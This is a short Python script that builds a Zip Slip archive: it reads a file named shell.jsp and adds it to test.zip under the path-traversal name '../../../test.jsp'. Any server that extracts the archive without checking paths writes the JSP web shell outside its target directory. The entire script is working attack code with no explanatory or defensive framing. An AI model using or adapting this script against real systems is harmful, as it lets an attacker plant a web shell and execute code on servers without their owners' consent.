import zipfile

def zip():
    try:
        with open("shell.jsp","r") as f:
            binary  =   f.read()
            zipFile = zipfile.ZipFile("test.zip","a",zipfile.ZIP_DEFLATED)
            zipFile.writestr("../../../test.jsp",binary)
            zipFile.close()
    except  IOError as e:
        raise e
        
        
if  __name__ == '__main__':
    zip()
            
        